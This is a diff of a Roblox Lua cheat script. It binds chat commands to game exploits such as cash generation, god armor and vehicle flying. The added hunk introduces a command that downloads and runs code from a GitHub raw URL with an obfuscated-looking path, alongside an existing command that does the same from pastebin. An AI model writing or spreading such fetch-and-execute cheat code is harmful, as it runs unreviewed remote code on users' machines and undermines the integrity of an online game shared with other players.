@@ -72,6 +72,9 @@ local function onChatMessage(message)
     elseif message == ";R15" then
         print("Loading R15 script")  -- Debug: Check if R15 command is received
         loadstring(game:HttpGet("https://pastebin.com/raw/7dSrNgif"))()
+    elseif message == ";FilteringEnabled?AnimMADEBYME" then
+        print("Loading FE ANIMATION FIGHTER REANINM - script")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/USJADJUDJASJD90123UJE8123/FEANIMRFASDIMASDISAilIlILIliiiiiiiiiiiiiiikLiioiikIIKIOLIKOLDSAIKL99O8IKAI9KDI98KA/refs/heads/main/FERTEANIMSDINADNIANIDPOILISLKADKOIASDIKI21V1.0"))()
     elseif message == ";generate cash" then
         print("Generating cash")  -- Debug: Check if cash generation command is received
         local AM2T = 10000
@@ -82,7 +85,6 @@ end
 -- Set up the chat listener
 game:GetService("Players").LocalPlayer.Chatted:Connect(onChatMessage)
 
-print("COMMANDS: ;R6, ;R15, !generate cash, ;pp, ;unpp, ;hotcawk")
 wait(1)
 -- Services
 local Players = game:GetService("Players")
@@ -399,7 +401,6 @@ RunService.Heartbeat:Connect(function()
         end
     end
 end)
-print("godarmor done")
 
 -- Vehicle Fly Script
 local Players = game:GetService("Players")
